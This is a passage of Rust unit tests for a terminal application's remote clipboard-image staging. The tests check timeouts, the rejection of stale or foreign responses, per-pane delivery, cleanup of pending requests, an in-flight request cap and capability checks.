                    app.handle_internal_event(ev);
                    announced_while_pending = app.state.toast.as_ref().map(|t| t.title.as_str())
                        == Some(TOAST_TITLE_SAVING);
                }
                AppEvent::FederationClipboardStageTimedOut { .. } => {
                    app.handle_internal_event(ev);
                    reaped = true;
                }
                other => panic!("an unexpected event reached the stage timers: {other:?}"),
            }
        }

        assert!(
            announced_while_pending,
            "no wait told the user the stage was still working"
        );
        assert!(reaped, "no wait reaped a stage the remote never answered");
        assert!(
            app.pending_remote_clipboard_stages.is_empty(),
            "an unanswered stage must not hold its in-flight slot forever"
        );
        assert_eq!(
            app.state.toast.as_ref().map(|toast| toast.context.as_str()),
            Some("the remote host did not answer in time")
        );
    }

    #[test]
    fn clipboard_stage_timeout_is_proportional_to_payload_size_not_fixed() {
        let small = stage_timeout_budget(64 * 1024);
        let large = stage_timeout_budget(16 * 1024 * 1024);
        assert!(
            large > small,
            "a 16 MiB payload must get more time than a 64 KiB one ({large:?} vs {small:?})"
        );
        assert!(small >= STAGE_TIMEOUT_BASE);
    }

    #[tokio::test]
    async fn clipboard_stage_response_from_a_restarted_remote_is_dropped_not_injected() {
        let mut app = test_app();
        let (pane_id, mut rx) = attach_runtime(&mut app, 0);
        let live = MountConnectionEpoch::mint();
        let superseded = MountConnectionEpoch::mint();
        assert_ne!(live, superseded);
        app.test_register_pending_clipboard_stage(
            3,
            pending_for(&app, pane_id, host_key(HOST), live),
        );

        app.handle_internal_event(ready_event(3, &staged_path(), host_key(HOST), superseded));
        assert!(rx.try_recv().is_err(), "a superseded answer must not paste");
        assert!(
            app.pending_remote_clipboard_stages.contains_key(&3),
            "a fenced answer must leave the entry claimable"
        );

        // Positive control: the same event on the live epoch does inject.
        app.handle_internal_event(ready_event(3, &staged_path(), host_key(HOST), live));
        assert_eq!(rx.try_recv().unwrap(), Bytes::from(staged_path()));
    }

    #[tokio::test]
    async fn clipboard_stage_response_after_a_remount_to_the_same_running_remote_is_dropped() {
        use crate::remote::federation::id::{Mount, ServerInstanceId};
        // The remote process never restarted, so both mounts carry the same
        // instance id and the same (constant) generation. Only the locally
        // minted epoch differs, so only the epoch check can do the work.
        let first = Mount {
            host_key: host_key(HOST),
            server_instance_id: ServerInstanceId("inst-1".to_string()),
            mount_generation: 1,
        };
        let second = Mount {
            host_key: host_key(HOST),
            server_instance_id: ServerInstanceId("inst-1".to_string()),
            mount_generation: 1,
        };
        assert_eq!(first.server_instance_id, second.server_instance_id);
        assert_eq!(first.mount_generation, second.mount_generation);

        let mut app = test_app();
        let (pane_id, mut rx) = attach_runtime(&mut app, 0);
        let superseded = MountConnectionEpoch::mint();
        let fresh = MountConnectionEpoch::mint();
        app.test_register_pending_clipboard_stage(
            5,
            pending_for(&app, pane_id, first.host_key.clone(), fresh),
        );

        app.handle_internal_event(ready_event(
            5,
            &staged_path(),
            second.host_key.clone(),
            superseded,
        ));
        assert!(rx.try_recv().is_err());
        assert!(app.pending_remote_clipboard_stages.contains_key(&5));

        app.handle_internal_event(ready_event(5, &staged_path(), second.host_key, fresh));
        assert_eq!(rx.try_recv().unwrap(), Bytes::from(staged_path()));
    }

    #[tokio::test]
    async fn clipboard_stage_response_from_a_different_hostkey_is_rejected() {
        let mut app = test_app();
        let (pane_id, mut rx) = attach_runtime(&mut app, 0);
        let epoch = MountConnectionEpoch::mint();
        app.test_register_pending_clipboard_stage(
            13,
            pending_for(&app, pane_id, host_key(HOST), epoch),
        );

        app.handle_internal_event(ready_event(
            13,
            &staged_path(),
            host_key("other-host"),
            epoch,
        ));
        assert!(rx.try_recv().is_err(), "a foreign mount must not paste");
        assert!(
            app.pending_remote_clipboard_stages.contains_key(&13),
            "a foreign answer must not evict the legitimate one"
        );

        app.handle_internal_event(ready_event(13, &staged_path(), host_key(HOST), epoch));
        assert_eq!(rx.try_recv().unwrap(), Bytes::from(staged_path()));
    }

    #[tokio::test]
    async fn remote_paste_injects_staged_path_through_local_paste_command() {
        let mut app = test_app();
        app.state
            .workspaces
            .push(crate::workspace::Workspace::test_new("elsewhere"));
        app.state.ensure_test_terminals();
        let (mint_time_pane, mut mint_rx) = attach_runtime(&mut app, 0);
        let (_focused_pane, mut focused_rx) = attach_runtime(&mut app, 1);
        // The user moves on while the transfer runs.
        app.state.selected = 1;
        app.state.active = Some(1);

        let epoch = MountConnectionEpoch::mint();
        app.test_register_pending_clipboard_stage(
            17,
            pending_for(&app, mint_time_pane, host_key(HOST), epoch),
        );
        app.handle_internal_event(ready_event(17, &staged_path(), host_key(HOST), epoch));

        assert_eq!(mint_rx.try_recv().unwrap(), Bytes::from(staged_path()));
        assert!(
            focused_rx.try_recv().is_err(),
            "the path must go to the pane that asked, not the focused one"
        );
    }

    #[tokio::test]
    async fn two_pastes_in_quick_succession_resolve_independently_and_in_any_completion_order() {
        let mut app = test_app();
        app.state
            .workspaces
            .push(crate::workspace::Workspace::test_new("second"));
        app.state.ensure_test_terminals();
        let (first_pane, mut first_rx) = attach_runtime(&mut app, 0);
        let (second_pane, mut second_rx) = attach_runtime(&mut app, 1);
        let epoch = MountConnectionEpoch::mint();

        let first = PendingClipboardStage {
            workspace_id: app.state.workspaces[0].id.clone(),
            target_pane_id: first_pane,
            origin: host_key(HOST),
            connection_epoch: epoch,
            payload_len: 1,
            deadline: Instant::now() + Duration::from_secs(60),
        };
        let second = PendingClipboardStage {
            workspace_id: app.state.workspaces[1].id.clone(),
            target_pane_id: second_pane,
            origin: host_key(HOST),
            connection_epoch: epoch,
            payload_len: 1,
            deadline: Instant::now() + Duration::from_secs(60),
        };
        app.test_register_pending_clipboard_stage(21, first);
        app.test_register_pending_clipboard_stage(22, second);

        let second_path =
            format!("/tmp/herdr-clipboard-images-501/{FEDERATION_CLIPBOARD_PREFIX}2-0-image.png");
        app.handle_internal_event(ready_event(22, &second_path, host_key(HOST), epoch));
        app.handle_internal_event(ready_event(21, &staged_path(), host_key(HOST), epoch));

        assert_eq!(second_rx.try_recv().unwrap(), Bytes::from(second_path));
        assert_eq!(first_rx.try_recv().unwrap(), Bytes::from(staged_path()));
        assert!(app.pending_remote_clipboard_stages.is_empty());
    }

    #[test]
    fn clipboard_stage_toast_copy_is_defined_for_every_failure_variant() {
        for failure in [
            ClipboardStageFailure::InvalidFilename,
            ClipboardStageFailure::UnsupportedExtension,
            ClipboardStageFailure::InvalidPayload,
            ClipboardStageFailure::PayloadTooLarge,
            ClipboardStageFailure::QuotaExceeded,
            ClipboardStageFailure::StagingUnavailable,
            ClipboardStageFailure::Busy,
            ClipboardStageFailure::WriteFailed,
        ] {
            let context = clipboard_stage_failure_context(failure);
            assert!(!context.is_empty(), "{failure:?} has no explanation");
            assert!(
                context.chars().count() <= 60,
                "{failure:?}'s explanation does not fit a toast: {context}"
            );
        }
        assert!(!TOAST_TITLE_FAILED.is_empty());
    }

    #[tokio::test]
    async fn a_stage_failure_from_the_remote_raises_a_toast_and_claims_the_entry() {
        let mut app = test_app();
        let (pane_id, mut rx) = attach_runtime(&mut app, 0);
        let epoch = MountConnectionEpoch::mint();
        app.test_register_pending_clipboard_stage(
            31,
            pending_for(&app, pane_id, host_key(HOST), epoch),
        );

        app.handle_internal_event(AppEvent::FederationClipboardStageFailed {
            request_id: 31,
            failure: ClipboardStageFailure::QuotaExceeded,
            origin: host_key(HOST),
            connection_epoch: epoch,
        });

        assert!(app.pending_remote_clipboard_stages.is_empty());
        assert_eq!(
            app.state.toast.as_ref().unwrap().context,
            clipboard_stage_failure_context(ClipboardStageFailure::QuotaExceeded)
        );
        assert!(rx.try_recv().is_err());
    }

    #[tokio::test]
    async fn a_slow_stage_raises_the_saving_toast_only_while_the_request_is_still_pending() {
        let mut app = test_app();
        let (pane_id, _rx) = attach_runtime(&mut app, 0);
        let epoch = MountConnectionEpoch::mint();
        app.test_register_pending_clipboard_stage(
            41,
            pending_for(&app, pane_id, host_key(HOST), epoch),
        );
        app.raise_slow_stage_toast_if_pending(41);
        assert_eq!(app.state.toast.as_ref().unwrap().title, TOAST_TITLE_SAVING);

        app.state.toast = None;
        app.raise_slow_stage_toast_if_pending(42);
        assert!(
            app.state.toast.is_none(),
            "an already-resolved request must not raise the saving toast"
        );
    }

    #[tokio::test]
    async fn clipboard_stage_pending_entries_purged_on_workspace_close_and_mount_end() {
        // Workspace-close site: only the closing workspace's entry goes.
        let mut app = test_app();
        app.state
            .workspaces
            .push(crate::workspace::Workspace::test_new("survivor"));
        app.state.ensure_test_terminals();
        let (pane_a, _rx_a) = attach_runtime(&mut app, 0);
        let (pane_b, _rx_b) = attach_runtime(&mut app, 1);
        let epoch = MountConnectionEpoch::mint();
        app.test_register_pending_clipboard_stage(
            51,
            pending_for(&app, pane_a, host_key(HOST), epoch),
        );
        let survivor = PendingClipboardStage {
            workspace_id: app.state.workspaces[1].id.clone(),
            target_pane_id: pane_b,
            origin: host_key(HOST),
            connection_epoch: epoch,
            payload_len: 1,
            deadline: Instant::now() + Duration::from_secs(60),
        };
        app.test_register_pending_clipboard_stage(52, survivor);
        assert_eq!(app.pending_remote_clipboard_stages.len(), 2);

        let closing: HashSet<String> = [app.state.workspaces[0].id.clone()].into_iter().collect();
        app.purge_pending_remote_clipboard_stages_for_workspaces(&closing);
        assert!(!app.pending_remote_clipboard_stages.contains_key(&51));
        assert!(
            app.pending_remote_clipboard_stages.contains_key(&52),
            "an unrelated workspace's stage must survive"
        );

        // Mount-end site: only the ending connection's entries go.
        let mut app = test_app();
        let (pane_id, _rx) = attach_runtime(&mut app, 0);
        let ending = MountConnectionEpoch::mint();
        let fresh = MountConnectionEpoch::mint();
        app.test_register_pending_clipboard_stage(
            61,
            pending_for(&app, pane_id, host_key(HOST), ending),
        );
        app.test_register_pending_clipboard_stage(
            62,
            pending_for(&app, pane_id, host_key(HOST), fresh),
        );
        app.test_register_pending_clipboard_stage(
            63,
            pending_for(&app, pane_id, host_key("other-host"), ending),
        );
        assert_eq!(app.pending_remote_clipboard_stages.len(), 3);

        app.purge_pending_remote_clipboard_stages_for_origin(&host_key(HOST), ending);
        assert!(!app.pending_remote_clipboard_stages.contains_key(&61));
        assert!(
            app.pending_remote_clipboard_stages.contains_key(&62),
            "a fresh remount's stage must survive a superseded connection's teardown"
        );
        assert!(
            app.pending_remote_clipboard_stages.contains_key(&63),
            "another host's stage must survive"
        );
    }

    /// Registers a bare mirror for `HOST` at `epoch`, standing in for a live
    /// mount without needing a real pane runtime behind it.
    fn register_mirror(app: &mut App, epoch: MountConnectionEpoch) {
        use crate::remote::federation::id::{Mount, ServerInstanceId};
        let mut mirror = crate::remote::federation::reducer::RemoteMirror::new(Mount {
            host_key: host_key(HOST),
            // Unchanged across both mounts: the remote process never
            // restarted, which is precisely why the instance id cannot fence.
            server_instance_id: ServerInstanceId("inst-1".to_string()),
            mount_generation: 1,
        });
        mirror.set_connection_epoch(epoch);
        app.state.remote_mirrors.insert(host_key(HOST), mirror);
    }

    #[tokio::test]
    async fn a_delayed_mount_ended_event_does_not_purge_or_end_a_fresh_remount() {
        let mut app = test_app();
        let (pane_id, mut rx) = attach_runtime(&mut app, 0);

        // Mount A, then its replacement B against the same still-running remote.
        let superseded = MountConnectionEpoch::mint();
        register_mirror(&mut app, superseded);
        app.state.end_federation_mount(&host_key(HOST));
        let fresh = MountConnectionEpoch::mint();
        register_mirror(&mut app, fresh);
        app.test_register_pending_clipboard_stage(
            71,
            pending_for(&app, pane_id, host_key(HOST), fresh),
        );

        // A's end-notice finally arrives. Same host key, same generation.
        app.handle_federation_mount_ended(
            host_key(HOST),
            1,
            superseded,
            HOST.to_string(),
            "link closed".to_string(),
        );

        assert!(
            app.state.remote_mirrors.contains_key(&host_key(HOST)),
            "a superseded end-notice must not tear down the live remount"
        );
        assert!(
            app.pending_remote_clipboard_stages.contains_key(&71),
            "a superseded end-notice must not purge the live remount's work"
        );

        app.handle_internal_event(ready_event(71, &staged_path(), host_key(HOST), fresh));
        assert_eq!(rx.try_recv().unwrap(), Bytes::from(staged_path()));
    }

    #[tokio::test]
    async fn a_matching_mount_ended_event_purges_the_connection_it_names() {
        let mut app = test_app();
        let (pane_id, _rx) = attach_runtime(&mut app, 0);
        let epoch = MountConnectionEpoch::mint();
        register_mirror(&mut app, epoch);
        app.test_register_pending_clipboard_stage(
            73,
            pending_for(&app, pane_id, host_key(HOST), epoch),
        );

        app.handle_federation_mount_ended(
            host_key(HOST),
            1,
            epoch,
            HOST.to_string(),
            "link closed".to_string(),
        );

        assert!(
            app.pending_remote_clipboard_stages.is_empty(),
            "the ending connection's pending work must not leak"
        );
        assert!(!app.state.remote_mirrors.contains_key(&host_key(HOST)));
    }

    /// Builds a live remote-backed pane on workspace 0 and registers a mirror
    /// that has negotiated staging, so `begin_remote_clipboard_stage` can run
    /// end to end.
    fn attach_live_mount(
        app: &mut App,
    ) -> (
        PaneId,
        mpsc::UnboundedReceiver<crate::remote::federation::protocol::FederationMessage>,
    ) {
        use crate::remote::federation::id::{Mount, ServerInstanceId};
        use std::collections::BTreeSet;

        let pane_id = app.state.workspaces[0].tabs[0].root_pane;
        let terminal_id = app.state.workspaces[0].tabs[0].panes[&pane_id]
            .attached_terminal_id
            .clone();
        let (out_tx, out_rx) = mpsc::unbounded_channel();
        let (_output_tx, output_rx) = mpsc::channel::<Bytes>(4);
        let (clipboard_tx, _clipboard_rx) = mpsc::unbounded_channel();
        let (events_tx, _events_rx) = mpsc::channel::<AppEvent>(8);
        let runtime = crate::terminal::TerminalRuntime::spawn_remote(
            pane_id,
            24,
            80,
            1 << 16,
            crate::terminal_theme::TerminalTheme::default(),
            None,
            "term_1".to_string(),
            1,
            out_tx,
            output_rx,
            clipboard_tx,
            events_tx,
            Arc::new(Notify::new()),
            Arc::new(AtomicBool::new(false)),
        )
        .expect("a remote runtime needs no local PTY");
        app.terminal_runtimes.insert(terminal_id, runtime);

        let key = host_key(HOST);
        app.state.workspaces[0].worktree_space = Some(crate::workspace::WorktreeSpaceMembership {
            key: format!("federation:{}", key.as_str()),
            label: "remote".to_string(),
            repo_root: std::path::PathBuf::from("/"),
            checkout_path: std::path::PathBuf::from("/"),
            is_linked_worktree: false,
        });
        let mut mirror = crate::remote::federation::reducer::RemoteMirror::new(Mount {
            host_key: key.clone(),
            server_instance_id: ServerInstanceId("inst-1".to_string()),
            mount_generation: 1,
        });
        let mut caps = BTreeSet::new();
        caps.insert(Capability::new(Capability::FILE_STAGING));
        mirror.set_agreed_capabilities(caps);
        mirror.set_connection_epoch(MountConnectionEpoch::mint());
        app.state.remote_mirrors.insert(key, mirror);
        (pane_id, out_rx)
    }

    fn test_image() -> crate::platform::ClipboardImage {
        crate::platform::ClipboardImage {
            bytes: vec![1, 2, 3, 4],
            extension: "png",
        }
    }

    #[tokio::test]
    async fn a_third_concurrent_stage_request_is_rejected_locally_at_the_in_flight_cap() {
        let mut app = test_app();
        let (pane_id, mut out_rx) = attach_live_mount(&mut app);
        let image = test_image();

        assert!(
            app.begin_remote_clipboard_stage(0, pane_id, &image).is_ok(),
            "the first stage must be accepted"
        );
        assert!(
            app.begin_remote_clipboard_stage(0, pane_id, &image).is_ok(),
            "the second stage must be accepted"
        );
        assert_eq!(app.pending_remote_clipboard_stages.len(), 2);
        let mut sent = Vec::new();
        while let Ok(msg) = out_rx.try_recv() {
            sent.push(msg);
        }
        assert_eq!(sent.len(), 2, "both accepted stages must reach the wire");

        app.state.toast = None;
        assert_eq!(
            app.begin_remote_clipboard_stage(0, pane_id, &image),
            Err(StageStartError::TooManyInFlight)
        );
        assert_eq!(
            app.pending_remote_clipboard_stages.len(),
            2,
            "a refused stage must not register"
        );
        assert!(
            out_rx.try_recv().is_err(),
            "a refused stage must not reach the wire"
        );
        assert!(
            app.state.toast.is_some(),
            "a refused stage must be reported"
        );

        // Resolving one of the first two frees a slot again.
        let resolved = *app
            .pending_remote_clipboard_stages
            .keys()
            .next()
            .expect("two stages are pending");
        app.pending_remote_clipboard_stages.remove(&resolved);
        assert!(app.begin_remote_clipboard_stage(0, pane_id, &image).is_ok());
        assert!(out_rx.try_recv().is_ok());
    }

    #[tokio::test]
    async fn a_stage_request_is_refused_when_the_mount_never_negotiated_staging() {
        let mut app = test_app();
        let (pane_id, mut out_rx) = attach_live_mount(&mut app);
        let key = host_key(HOST);
        app.state
            .remote_mirrors
            .get_mut(&key)
            .unwrap()
            .set_agreed_capabilities(std::collections::BTreeSet::new());

        assert_eq!(
            app.begin_remote_clipboard_stage(0, pane_id, &test_image()),
            Err(StageStartError::CapabilityNotAgreed)
        );
        assert!(
            out_rx.try_recv().is_err(),
            "an ungated stage frame would kill the mount"
        );
        assert!(app.pending_remote_clipboard_stages.is_empty());
        assert!(app.state.toast.is_some());
    }

    #[tokio::test]
    async fn a_stage_request_on_a_pane_without_a_live_mount_is_refused() {
        let mut app = test_app();
        let (pane_id, _rx) = attach_runtime(&mut app, 0);
        assert_eq!(
            app.begin_remote_clipboard_stage(0, pane_id, &test_image()),
            Err(StageStartError::NoLiveMount)
        );
        assert!(app.pending_remote_clipboard_stages.is_empty());
        assert!(app.state.toast.is_some());
    }
}
